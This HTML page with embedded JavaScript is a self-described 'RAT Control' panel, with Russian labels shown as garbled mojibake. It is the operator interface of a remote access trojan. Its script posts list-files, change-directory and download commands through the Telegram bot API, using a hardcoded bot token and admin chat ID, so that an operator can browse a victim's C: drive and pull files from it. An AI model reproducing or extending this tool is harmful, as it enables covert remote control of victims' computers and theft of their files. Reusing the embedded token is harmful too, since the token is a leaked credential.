<!DOCTYPE html>
<html>
<head>
    <title>RAT Control</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: #f0f0f0;
            padding: 20px;
        }
        .header {
            background: #0088cc;
            color: white;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            text-align: center;
        }
        .button {
            background: #0088cc;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 15px 20px;
            font-size: 16px;
            width: 100%;
            margin: 5px 0;
            cursor: pointer;
            transition: 0.3s;
        }
        .button:hover { background: #006699; }
        .button.secondary { background: #666; }
        .button.danger { background: #dc3545; }
        .file-list {
            background: white;
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
            max-height: 400px;
            overflow-y: auto;
        }
        .file-item {
            padding: 10px;
            border-bottom: 1px solid #eee;
            display: flex;
            align-items: center;
            cursor: pointer;
        }
        .file-item:hover { background: #f5f5f5; }
        .icon { font-size: 20px; margin-right: 10px; }
        .name { flex: 1; }
        .size { color: #666; font-size: 12px; }
        .status {
            margin-top: 10px;
            padding: 10px;
            border-radius: 5px;
            display: none;
        }
        .status.success { background: #d4edda; color: #155724; display: block; }
        .status.error { background: #f8d7da; color: #721c24; display: block; }
        .path {
            background: #e9ecef;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            font-family: monospace;
            word-break: break-all;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>ü§ñ RAT CONTROL</h1>
        <p>–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∫–æ–º–ø—å—é—Ç–µ—Ä–æ–º —á–µ—Ä–µ–∑ Telegram</p>
    </div>

    <div class="path" id="currentPath">C:\</div>

    <button class="button" onclick="loadFiles()">üìã –ó–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª—ã</button>
    <button class="button secondary" onclick="goBack()">‚¨ÜÔ∏è –ù–∞–∑–∞–¥</button>

    <div class="input-group" style="display: flex; gap: 8px; margin: 10px 0;">
        <input type="text" id="folderInput" placeholder="–í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å –∫ –ø–∞–ø–∫–µ" style="flex: 1; padding: 12px; border: 1px solid #ddd; border-radius: 5px;">
        <button class="button secondary" onclick="changeDir()" style="width: auto;">–ü–µ—Ä–µ–π—Ç–∏</button>
    </div>

    <div class="input-group" style="display: flex; gap: 8px; margin: 10px 0;">
        <input type="text" id="fileInput" placeholder="–ò–º—è —Ñ–∞–π–ª–∞ –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è" style="flex: 1; padding: 12px; border: 1px solid #ddd; border-radius: 5px;">
        <button class="button secondary" onclick="downloadFile()" style="width: auto;">üì• –°–∫–∞—á–∞—Ç—å</button>
    </div>

    <div id="status" class="status"></div>

    <div id="fileList" class="file-list">
        <div style="text-align: center; color: #666; padding: 20px;">
            –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–æ–≤
        </div>
    </div>

    <script>
        // –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
        let currentDir = 'C:\\';
        const ADMIN_ID = 7266658879;
        const BOT_TOKEN = '8417099264:AAHZ_xx4NfBLs04BoGyutO0_dwaa66b-ECo';
        
        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –∑–∞–ø—Ä–æ—Å–∞ –∫ –±–æ—Ç—É —á–µ—Ä–µ–∑ HTTP (–ù–ï —á–µ—Ä–µ–∑ Telegram)
        async function sendBotRequest(action, params = {}) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            const message = {
                chat_id: ADMIN_ID,
                text: JSON.stringify({
                    action: action,
                    params: params,
                    from_webapp: true
                })
            };
            
            showStatus('‚è≥ –û—Ç–ø—Ä–∞–≤–∫–∞ –∑–∞–ø—Ä–æ—Å–∞...', 'info');
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(message)
                });
                
                const data = await response.json();
                console.log('üì® –û—Ç–≤–µ—Ç:', data);
                
                if (data.ok) {
                    showStatus('‚úÖ –ó–∞–ø—Ä–æ—Å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω', 'success');
                } else {
                    showStatus('‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏', 'error');
                }
                
                return data;
            } catch (error) {
                showStatus('‚ùå ' + error.message, 'error');
                return null;
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ñ–∞–π–ª–æ–≤
        async function loadFiles() {
            showStatus('‚è≥ –ó–∞–ø—Ä–æ—Å —Å–ø–∏—Å–∫–∞ —Ñ–∞–π–ª–æ–≤...', 'info');
            await sendBotRequest('list_files', { path: currentDir });
        }

        // –§—É–Ω–∫—Ü–∏—è "–ù–∞–∑–∞–¥"
        async function goBack() {
            await sendBotRequest('go_back', { path: currentDir });
        }

        // –°–º–µ–Ω–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
        async function changeDir() {
            const path = document.getElementById('folderInput').value;
            if (!path) return;
            await sendBotRequest('change_dir', { current: currentDir, path: path });
            document.getElementById('folderInput').value = '';
        }

        // –°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª
        async function downloadFile() {
            const name = document.getElementById('fileInput').value;
            if (!name) return;
            const path = currentDir + '\\' + name;
            await sendBotRequest('get', { path: path });
            document.getElementById('fileInput').value = '';
        }

        // –û—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤
        function displayFiles(data) {
            if (!data || !data.files) return;
            
            currentDir = data.current_dir;
            document.getElementById('currentPath').textContent = currentDir;
            
            let html = '';
            data.files.forEach(f => {
                const icon = f.is_dir ? 'üìÅ' : 'üìÑ';
                html += `
                    <div class="file-item" onclick="selectFile('${f.name}')">
                        <span class="icon">${icon}</span>
                        <span class="name">${f.name}</span>
                        <span class="size">${f.size}</span>
                    </div>
                `;
            });
            
            document.getElementById('fileList').innerHTML = html;
            showStatus('‚úÖ –§–∞–π–ª—ã –∑–∞–≥—Ä—É–∂–µ–Ω—ã', 'success');
        }

        // –í—ã–±–æ—Ä —Ñ–∞–π–ª–∞
        function selectFile(name) {
            document.getElementById('fileInput').value = name;
        }

        // –°—Ç–∞—Ç—É—Å
        function showStatus(text, type) {
            const status = document.getElementById('status');
            status.className = 'status ' + type;
            status.textContent = text;
            setTimeout(() => {
                status.className = 'status';
            }, 3000);
        }

        // –°–ª—É—à–∞–µ–º –æ—Ç–≤–µ—Ç—ã –æ—Ç –±–æ—Ç–∞ (–æ–Ω–∏ –ø—Ä–∏—Ö–æ–¥—è—Ç –≤ —á–∞—Ç, –Ω–æ –º—ã –∏—Ö –ª–æ–≤–∏–º —á–µ—Ä–µ–∑ getUpdates)
        // –î–ª—è –ø—Ä–æ—Å—Ç–æ—Ç—ã –ø–æ–∫–∞ –ø—Ä–æ—Å—Ç–æ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º, —á—Ç–æ –Ω—É–∂–Ω–æ –æ–±–Ω–æ–≤–∏—Ç—å —Å—Ç—Ä–∞–Ω–∏—Ü—É
        setInterval(async () => {
            // –ó–¥–µ—Å—å –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –ø–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫—É—é –ø—Ä–æ–≤–µ—Ä–∫—É –Ω–æ–≤—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π
            // –ù–æ –¥–ª—è –Ω–∞—á–∞–ª–∞ –ø—Ä–æ—Å—Ç–æ —Å–∫–∞–∂–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é –æ–±–Ω–æ–≤–∏—Ç—å —Å—Ç—Ä–∞–Ω–∏—Ü—É
        }, 5000);
    </script>
</body>
</html>
